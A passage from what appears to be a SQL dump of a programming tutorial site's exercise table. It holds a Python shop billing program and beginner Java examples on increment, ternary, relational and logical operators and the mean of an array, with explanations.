Valid Item ID<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\">while</span><span style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"> </span><span style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\">not</span><span style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"> item_id </span><span style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\">in</span><span style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"> items:<br></span>            print(\"Not Valid Item id\")<br>            item_id = int(input(\"Enter item id:\"))<br>&nbsp; &nbsp; &nbsp; &nbsp; update_item(item_id)</pre><pre style=\"line-height: 1.42857; background-color: rgb(255, 255, 255); text-align: justify;\">#Billing<br>def sale(trans_id):<br>&nbsp; &nbsp; total = 0<br>&nbsp; &nbsp; transaction_items = {}<br>&nbsp; &nbsp; while True:<br>&nbsp; &nbsp; &nbsp; &nbsp; item_id = int(input(\"Enter item id (0 if no item):\"))<br>&nbsp; &nbsp; &nbsp; &nbsp; if item_id == 0:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break<br>&nbsp; &nbsp; &nbsp; &nbsp; else:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style=\"color: rgb(51, 51, 51); font-size: 13px; text-align: justify; font-family: Consolas, &quot;Courier New&quot;, monospace;\">while</span><span style=\"color: rgb(51, 51, 51); font-size: 13px; text-align: justify; font-family: Consolas, &quot;Courier New&quot;, monospace;\"> </span><span style=\"color: rgb(51, 51, 51); font-size: 13px; text-align: justify; font-family: Consolas, &quot;Courier New&quot;, monospace;\">not</span><span style=\"color: rgb(51, 51, 51); font-size: 13px; text-align: justify; font-family: Consolas, &quot;Courier New&quot;, monospace;\"> item_id </span><span style=\"color: rgb(51, 51, 51); font-size: 13px; text-align: justify; font-family: Consolas, &quot;Courier New&quot;, monospace;\">in</span><span style=\"color: rgb(51, 51, 51); font-size: 13px; text-align: justify; font-family: Consolas, &quot;Courier New&quot;, monospace;\"> items:<br></span>            &nbsp;&nbsp;&nbsp;&nbsp;print(\"Not Valid Item id\")<br>            &nbsp;&nbsp;&nbsp;&nbsp;item_id = int(input(\"Enter item id:\"))<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; quantity = int(input(\"Enter Quantity:\"))<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; amount = items[item_id][\'Price_per_kg\'] * quantity<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; items[item_id][\'Quantity_in_kgs\'] = items[item_id][\'Quantity_in_kgs\'] - quantity&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; total += amount<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; transaction_items[item_id] = [quantity,amount]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(\'Item id | Item Name | Quantity | Price | Amount\')<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for item in transaction_items:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(item, \"| \", items[item][\'item_name\'], \" | \",transaction_items[item][0], \" | \", items[item][\'Price_per_kg\'], \" | \", transaction_items[item][1])<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(\"---------------------------------------------------\")<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(\"Total:\\t\\t\\t \", total)<br>&nbsp; &nbsp; trans[trans_id] = transaction_items</pre><pre>#Main Function<br>while True:<br>&nbsp; &nbsp; print(\"Billing System\\n Enter Your Choice \\n 1. Add Items \\n 2. Sales \\n 3. Check Stock \\n 4. Exit \")<br>&nbsp; &nbsp; choice = int(input(\"Your Choice:\"))<br>&nbsp; &nbsp; if choice == 1:<br>&nbsp; &nbsp; &nbsp; &nbsp; add_item()<br>&nbsp; &nbsp; elif choice == 2:<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; trans_ids = list(trans.keys())<br>&nbsp; &nbsp; &nbsp; &nbsp; if len(trans_ids) == 0:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; trans_id = 201<br>&nbsp; &nbsp; &nbsp; &nbsp; else:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; trans_id = max(trans_ids) + 1<br>&nbsp; &nbsp; &nbsp; &nbsp; sale(trans_id)<br>&nbsp; &nbsp; elif choice == 3:<br>&nbsp; &nbsp; &nbsp; &nbsp; stock_check()<br>&nbsp; &nbsp; elif choice == 4:<br>&nbsp; &nbsp; &nbsp; &nbsp; break<br>&nbsp; &nbsp; else:<br>&nbsp; &nbsp; &nbsp; &nbsp; print(\"Invalid Choice\")</pre><p><br></p>',NULL,'<p>add_item() method checks whether the item is existing item or new item to the fruit shop.</p><p>if item is new then it calls add_new_item() method else it call update_item() method.&nbsp;</p><p>sale() method gets detail of each item and fetch price from dictionary to calculate amount. amount will be added to the total. Sale() method finally decrease the sold quantity in item dictionary.</p><p>stock_check() method prints all items and its available quantity.<br></p><p><br></p>',30,'','','Billin_System_in_Python.jpg'),(1119,'Post Increment Operator Example in Java','post-increment-operator-example-in-java','<p>Write a Java Program to illustrate the effect of Post&nbsp; increment in the current and next expression.</p><p>It means a++ uses the value of a in current expression and increments the value of a by 1. So the increment reflects in the next statement.</p><p><br></p>','B','<p>class Postinc</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><span style=\"white-space:pre\">	</span>{</p><p><span style=\"white-space:pre\">		</span>int a = 10;</p><p><span style=\"white-space:pre\">		</span>int b;</p><p><span style=\"white-space:pre\">	</span></p><p><span style=\"white-space:pre\">		</span>b = a++;</p><p><span style=\"white-space:pre\">		</span>System.out.println(a);</p><p><span style=\"white-space:pre\">		</span>System.out.println(b);</p><p><span style=\"white-space:pre\">	</span>}</p><p>}</p><p><span style=\"white-space:pre\">		</span></p>',NULL,'<p>In the above program value of a (10) will be assigned to the b and a will be incremented by 1. So finally b is 10 and a is 11.</p>',22,'output/postinc.png','',''),(1120,'Pre Increment Operator Example in Java','pre-increment-operator-example-in-java','<p>Write a Java Program to illustrate the effect of Pre&nbsp; increment in the current and next expression.</p><p>It means ++a increments the value of a by 1 uses the value of a in current expression. So the increment reflects in the current statement.</p><p><br style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\"></p>','B','<p>class Preinc</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><span style=\"white-space:pre\">	</span>{</p><p><span style=\"white-space:pre\">		</span>int a = 10;</p><p><span style=\"white-space:pre\">		</span>int b;</p><p><span style=\"white-space:pre\">	</span></p><p><span style=\"white-space:pre\">		</span>b = ++a;</p><p><span style=\"white-space:pre\">		</span>System.out.println(a);</p><p><span style=\"white-space:pre\">		</span>System.out.println(b);</p><p><span style=\"white-space:pre\">	</span>}</p><p>}</p><p><span style=\"white-space:pre\">		</span></p>',NULL,'<div class=\"entity_wrapper\" style=\"margin-bottom: 10px; color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; height: auto !important;\"><div class=\"entity_content\" style=\"margin-top: 20px; margin-bottom: 20px; text-align: justify;\"><p>In the above program value of a (10) a will be incremented by 1 and will be assigned to the b. So finally b is 11 and a is 11.</p></div></div>',22,'','raptor/preinc.png',''),(1121,'Pre Increment and Post Increment Difference in java with Example','pre-and-post-difference-with-example','<p>Write a java program that illustrate difference between pre and post increment. The example should cover all the dimensions of the increment/decrement operators.</p>','B','<p>import java.util.*;</p><p>class PreandPost</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p>&nbsp; &nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p>&nbsp;<span style=\"white-space:pre\">		</span>int a =10;</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%d %d\\n\",++a,a); //Prints 11 11</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%d %d\\n\",a++,a); //Prints 11 12</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%d %d\\n\",++a,++a); // Prints 13 14</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%d %d\\n\",a++,a++); // Prints 14 15</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%d %d\\n\",++a,a++); //Prints 17 17</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%d %d\\n\",a++,++a); // Prints 18 20</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">	</span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">	</span>}</p><p><br></p><p>}</p>',NULL,'<p>In the above&nbsp; example all the ++a increments the value by 1 and prints the value.&nbsp;</p><p>all the a++ prints the value and increments the value by 1.</p>',22,'output/preandpost.png','',''),(1122,'Ternary Operator Example in Java','ternary-operator-example-in-java','<p>Ternary operator is a conditional operator which has three operands. It is best replacement one-liner for simple if-else statement.</p><p>The first operand of ternary operator is a boolean value or expression that returns boolean value. In the next two operands (or statements), either of the operand will be executed based on the value of first&nbsp; operand.</p><p>The below Program illustrates the working principles of ternary operator.</p><p><b><i>condition?statement1:statement2</i></b></p>','B','<p>class Ternary</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><span style=\"white-space:pre\">	</span>{</p><p><span style=\"white-space:pre\">		</span>int a = 10;</p><p><span style=\"white-space:pre\">		</span>int b = 20;</p><p><span style=\"white-space:pre\">		</span>int c = a&gt;b?a:b;</p><p><span style=\"white-space:pre\">		</span>System.out.println(c);</p><p><span style=\"white-space:pre\">		</span>System.out.println(true?\"Decode\":\"School\");</p><p><span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'<p>In the First println() a is not greater than b so c is 20.</p><p>In the second println() first operand is true so it prints \"Decode\"</p>',22,'output/ternary.png','',''),(1123,'Relational Operators Example in java','relational-operators-example-in-java','<p>Write a Java&nbsp; Program which illustrates the relational operators, it purpose, and supported data types.</p><p><br></p>','B','<p>import java.util.Scanner;</p><p>class Operator</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><span style=\"white-space:pre\">	</span>{</p><p><span style=\"white-space:pre\">		</span>int num_1 = 10;</p><p><span style=\"white-space:pre\">		</span>int num_2 = 20;</p><p><br></p><p><span style=\"white-space:pre\">		</span>char ch_1 = \'D\';</p><p><span style=\"white-space:pre\">		</span>char ch_2 = \'E\';</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>String name_1 = \"Decode\";</p><p><span style=\"white-space:pre\">		</span>String name_2 = \"Decode\";</p><p><span style=\"white-space:pre\">			</span></p><p><span style=\"white-space:pre\">		</span>boolean val_1 = true;</p><p><span style=\"white-space:pre\">		</span>boolean val_2 = false;</p><p><span style=\"white-space: pre;\">		</span>//Scanner sc = new Scanner(System.in);<br></p><p><span style=\"white-space:pre\">		</span>//name_2 = sc.next();</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>//Comparing Numbers like int and float are acceptable</p><p><span style=\"white-space:pre\">		</span>System.out.println(\"Comparing Numbers\");<span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>System.out.println(num_1&lt;num_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_1&gt;num_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_1&lt;=num_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_1&gt;=num_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_1==num_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_1!=num_2);</p><p><br></p><p><span style=\"white-space:pre\">		</span>//Comparing Characters are acceptable</p><p><span style=\"white-space:pre\">		</span>System.out.println(\"Comparing Characters\");<span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>System.out.println(ch_1&lt;ch_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch_1&gt;ch_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch_1&lt;=ch_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch_1&gt;=ch_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch_1==ch_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch_1!=ch_2);</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>//Comparing Strings are not possible with Strings.</p><p><span style=\"white-space:pre\">		</span>System.out.println(\"Comparing String will not work\");</p><p><span style=\"white-space:pre\">		</span>//System.out.println(name_1&lt;name_2);</p><p><span style=\"white-space:pre\">		</span>//System.out.println(name_1&gt;name_2);</p><p><span style=\"white-space:pre\">		</span>//System.out.println(name_1&lt;=name_2);</p><p><span style=\"white-space:pre\">		</span>//System.out.println(name_1&gt;=name_2);</p><p><span style=\"white-space: pre;\">		</span>System.out.println(name_1==name_2); // However this is not right method to compare Strings.<br></p><p><span style=\"white-space:pre\">		</span>System.out.println(name_1!=name_2); // However this is not right method to compare Strings.</p><p><span style=\"white-space: pre;\">	</span>&nbsp; &nbsp; &nbsp; &nbsp; </p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //Comparing Booleans \"equal to\" and \"not equal to\" are allowed<br></p><p><span style=\"white-space:pre\">		</span>System.out.println(\"Comparing Boolean\");<span style=\"white-space:pre\">	</span></p><p><span style=\"white-space:pre\">		</span>//System.out.println(val_1&lt;val_2);</p><p><span style=\"white-space:pre\">		</span>//System.out.println(val_1&gt;val_2);</p><p><span style=\"white-space:pre\">		</span>//System.out.println(val_1&lt;=val_2);</p><p><span style=\"white-space:pre\">		</span>//System.out.println(val_1&gt;=val_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(val_1==val_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(val_1!=val_2);</p><p><span style=\"white-space: pre;\">	</span>}<br></p><p>}</p>',NULL,'<p>Relational operators or conditional operators are used to compare two operands and returns binary value.&nbsp;</p><p>Comparisons include equality, inequality, greater, and lesser. Relational operators return true if the comparison is correct, else return false.</p><p>Relational Operators can be used with following data types.</p><table class=\"table table-bordered\"><tbody><tr><td>Operator</td><td>Integer/Long</td><td>Float/Double</td><td>Character</td><td>String&nbsp;</td><td>Boolean</td></tr><tr><td>Equal to (==)</td><td><p>&nbsp; &nbsp; &nbsp; &nbsp;<font color=\"#397b21\"> ✓<br></font></p></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; &nbsp; ✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; ✓</font></td><td><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<font color=\"#ff0000\"> ✓</font></p><p>(Does not compare</p><p>Strings. It compare String Location address)</p></td><td>&nbsp; &nbsp; &nbsp;<font color=\"#397b21\">✓</font></td></tr><tr><td>Not Equal to (!=)</td><td>&nbsp; &nbsp; &nbsp; <font color=\"#397b21\">&nbsp; ✓</font></td><td><p><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;✓</font></p></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; ✓</font></td><td><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<font color=\"#ff0000\">✓</font></p><p>(Does not compare</p><p>Strings. It compare String Location address)</p></td><td>&nbsp; &nbsp; &nbsp;<font color=\"#397b21\">✓</font></td></tr><tr><td>Less than (&lt;)</td><td>&nbsp; &nbsp; &nbsp; <font color=\"#397b21\">&nbsp;✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; &nbsp; ✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; ✓</font></td><td><br></td><td><br></td></tr><tr><td>Greater than (&gt;)</td><td>&nbsp; &nbsp; &nbsp;<font color=\"#397b21\"> ✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; &nbsp;✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; ✓</font></td><td><br></td><td><br></td></tr><tr><td>Less than or Equal to (&lt;=)</td><td>&nbsp; &nbsp; &nbsp;<font color=\"#397b21\"> ✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; &nbsp;✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; ✓</font></td><td><br></td><td><br></td></tr><tr><td>Greater than or Equal to (&gt;=)</td><td>&nbsp; &nbsp;<font color=\"#397b21\"> &nbsp;✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; &nbsp;✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp;✓</font></td><td><br></td><td><br></td></tr></tbody></table><p>== does not compare two strings, instead compare memory location of two strings. To understand remove the // in the following lines and give \"Decode\" as input and check.</p><pre style=\"line-height: 1.42857; background-color: rgb(255, 255, 255); text-align: justify;\"><p>//Scanner sc = new Scanner(System.in);<br></p><p>//name_2 = sc.next();</p></pre><p>&nbsp;it returns false even though both of the string variables has \"Decode\".</p>',22,'output/operator.png','',''),(1124,'Logical Operators Example in Java','logical-operators-example-in-java','<p>Write a Program to illustrate Logical Operators in Java. The program should clearly demonstrate the working and supported data types of Logical Operator in Java.</p><p>These operators conduct logical \"AND,\" \"OR,\" and \"NOT\" operations, which are comparable to the AND and OR gates in digital electronics. They\'re used to integrate two or more conditions/constraints or to supplement the evaluation of a specific condition. One point to bear in mind is that if the first condition is false, the second condition is not examined, resulting in a short-circuiting effect. Used to test for a variety of conditions before deciding.<br></p>','B','<p>import java.util.Scanner;</p><p>class L_Operator</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><span style=\"white-space:pre\">	</span>{</p><p><span style=\"white-space:pre\">		</span>int num_1 = 10;</p><p><span style=\"white-space:pre\">		</span>int num_2 = 20;</p><p><br></p><p><span style=\"white-space:pre\">		</span>char ch_1 = \'D\';</p><p><span style=\"white-space:pre\">		</span>char ch_2 = \'E\';</p><p><span style=\"white-space:pre\">		</span>String name_1 = \"Decode\";</p><p><span style=\"white-space:pre\">		</span>String name_2 = \"Decode\";</p><p><span style=\"white-space:pre\">		</span>boolean val_1 = true;</p><p><span style=\"white-space:pre\">		</span>boolean val_2 = false;</p><p><span style=\"white-space: pre;\">		</span><br></p><p><span style=\"white-space:pre\">		</span>//Logical Operation on&nbsp; Numbers like int and float are not acceptable</p><p><span style=\"white-space:pre\">	</span>&nbsp; &nbsp; &nbsp; &nbsp; //System.out.println(num_1 &amp;&amp; num_2);</p><p><span style=\"white-space:pre\">		</span>//System.out.println(num_1 || num_2);</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space: pre;\">		</span>//Logical Operation on Characters are not acceptable<br></p><p><span style=\"white-space: pre;\">		</span>//System.out.println(ch_1 &amp;&amp; ch_2);</p><p><span style=\"white-space:pre\">		</span>//System.out.println(ch_1 || ch_2);</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>//Logical Operation on Strings are not acceptable</p><p><span style=\"white-space:pre\">		</span>//System.out.println(name_1 &amp;&amp; name_2);&nbsp;</p><p><span style=\"white-space:pre\">		</span>//System.out.println(name_1 || name_2);&nbsp;</p><p><span style=\"white-space: pre;\">	</span><br></p><p><span style=\"white-space:pre\">		</span>//Logical Operation on boolean are allowed</p><p><span style=\"white-space:pre\">		</span>System.out.println(val_1 &amp;&amp; val_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(val_1 || val_2);</p><p><span style=\"white-space:pre\">		</span>System.out.println(!val_2); // unary Operator</p><p><br></p><p><span style=\"white-space:pre\">		</span>//Logical operation on Relational Experession</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_1 &lt; num_2 &amp;&amp; num_1 != 0);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_1 &lt; num_2 || num_1 != 0);</p><p><span style=\"white-space:pre\">		</span>System.out.println(!(num_1 &lt; num_2)); // unary Operator</p><p><br></p><p><span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'<p><br></p><table class=\"table table-bordered\"><tbody><tr><td><b>Operator</b></td><td><b>Boolean</b></td><td><b>Expression Which Returns Boolean</b></td><td><b>Any Other Data Type</b></td></tr><tr><td>Logical AND (&amp;&amp;)</td><td><span style=\"color: rgb(57, 123, 33); font-family: Roboto, serif; font-size: 17px; text-align: justify;\">&nbsp; &nbsp; ✓</span><br></td><td>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;✓</td><td><br></td></tr><tr><td>Logical OR (||)</td><td>&nbsp; &nbsp;<font color=\"#397b21\"> &nbsp;✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ✓</font></td><td><br></td></tr><tr><td>Logical Not (!)</td><td>&nbsp; <font color=\"#397b21\">&nbsp;&nbsp;&nbsp;✓</font></td><td><font color=\"#397b21\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ✓</font></td><td><br></td></tr></tbody></table><p>The Following Table Demonstrates the Data Type supported for Logical Operators.</p><p><br></p>',22,'output/lop.png','',''),(1125,'Mean of an Array in Java','mean-of-an-array-in-java','<p class=\"MsoNormal\"><span lang=\"EN-US\"><span style=\"font-family: &quot;Times New Roman&quot;;\">The average\r\nof all the numbers in the array is referred to as the mean. In other words, it\r\nis the total of all the numbers in the array divided by the total number of\r\nnumbers.</span><o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\"><span style=\"font-family: &quot;Times New Roman&quot;;\">Get an\r\narray of Integers </span><i><span style=\"font-family: &quot;Times New Roman&quot;;\">arr[]</span></i><span style=\"font-family: &quot;Times New Roman&quot;;\"> with size </span><i><span style=\"font-family: &quot;Times New Roman&quot;;\">n</span></i><span style=\"font-family: &quot;Times New Roman&quot;;\"> and calculate the mean value of </span><i><span style=\"font-family: &quot;Times New Roman&quot;;\">arr[]</span></i><o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\"><span style=\"font-family: &quot;Times New Roman&quot;;\">Example</span><o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Input 1:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\"><span style=\"font-family: &quot;Times New Roman&quot;;\">5</span><o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\"><span style=\"font-family: &quot;Times New Roman&quot;;\">1 2 3 4 5</span><o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\"><span style=\"font-family: &quot;Times New Roman&quot;;\">Output 1:</span><o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\"><span style=\"font-family: &quot;Times New Roman&quot;;\">3</span><o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\"><span style=\"font-family: &quot;Times New Roman&quot;;\">Explanation:</span><o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\"><span lang=\"EN-US\">(1+2+3+4+5\r\n= 15/5 = 3)<o:p></o:p></span></p>','B','<p><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">import java.util.*;</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">class Mean&nbsp;</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">public static void main(String args[])</span></span></p><p><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">&nbsp; &nbsp; </span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">{</span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Variable and&nbsp; Object Declarations</b></span><br></p><p><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">&nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">Scanner input = new Scanner(System.in);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">int n;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">float sum = 0f,</span></span><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp;mean;</span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Getting size of Array &amp; Declare Array arr[]</b></span><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">n = input.nextInt();</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">int arr[] = new int[n];</span></span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Get n values to array arr[]</b></span><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">for(int i = 0; i&lt;n; i++)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">arr[i] = input.nextInt();</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">}</span></span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Calcualte Sum and Mean</b></span><br></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">for(int i = 0; i&lt;n; i++)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">sum+= arr[i];</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">}</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">mean = sum/n;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">System.out.print(mean);</span></span></p><p><br></p><p><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">&nbsp; &nbsp; &nbsp; </span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;; font-size: 14px;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">}</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;; font-size: 14px;\">}</span></p>',NULL,'',31,'','',''),(1126,'Median of an Array in Java','median-of-an-array-in-java','<p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\">In a sorted 